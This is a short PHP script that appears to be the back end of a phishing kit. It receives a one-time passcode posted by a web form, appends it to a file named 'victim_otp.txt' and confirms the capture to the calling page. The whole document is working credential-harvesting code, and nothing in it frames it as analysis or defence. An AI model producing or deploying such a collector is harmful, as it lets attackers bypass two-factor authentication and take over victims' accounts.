<?php
// Path to log file
$log_file = 'victim_otp.txt';

// Collect the OTP
$otp = $_POST['otp'] ?? '';

// Append OTP to the log file
file_put_contents($log_file, "OTP Collected: $otp\n", FILE_APPEND);

// Respond to the AJAX request
echo "OTP logged successfully.";
?>
